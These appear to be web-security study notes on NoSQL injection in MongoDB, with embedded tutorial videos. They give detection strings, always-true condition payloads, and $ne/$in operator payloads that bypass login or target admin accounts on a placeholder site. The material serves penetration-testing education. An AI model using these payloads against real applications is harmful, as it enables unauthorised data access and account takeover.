<iframe title="Find and Exploit NoSQL Injection" src="https://www.youtube.com/embed/zHxgZJCy9fA?feature=oembed" height="113" width="200" allowfullscreen="" allow="fullscreen" style="aspect-ratio: 1.76991 / 1; width: 100%; height: 100%;"></iframe>

<iframe title="Second order NoSQL injection? - Solution to January '23 Challenge" src="https://www.youtube.com/embed/bAWOY2sim4o?feature=oembed" height="113" width="200" allowfullscreen="" allow="fullscreen" style="aspect-ratio: 1.76991 / 1; width: 100%; height: 100%;"></iframe>


## NoSQL syntax injection

### Detecting syntax injection in MongoDB

Your request:
```
https://insecure-website.com/product/lookup?category=fizzy
```

This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:

`this.category == 'fizzy'`

#### To Test it:
```
'"`{ ;$Foo} $Foo \xYZ
```

If you counter a website uses json as a request then the payload would be this:
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

#### Determining which characters are processed

try `'` if the original response changed then it might be vulnerable.

you can also confirm by escaping it `\'`


#### Confirming conditional behavior

After detecting a vulnerability, the next step is to determine whether you can influence boolean conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x` as follows:

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`
`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x`

If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

#### Overriding existing conditions

Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||1||'`:

`https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27`

This results in the following MongoDB query:

`this.category == 'fizzy'||'1'=='1'`

As the injected condition is always true, the modified query returns all items. This enables you to view all the products in any category, including hidden or unknown categories.

## NoSQL operator injection

- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified regular expression.

### Submitting query operators

In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

### Detecting operator injection in MongoDB

Consider a vulnerable application that accepts a username and password in the body of a `POST` request:
`{"username":"wiener","password":"peter"}`

Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection:
`{"username":{"$ne":"invalid"},"password":{"peter"}}`

If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:
`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:
`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

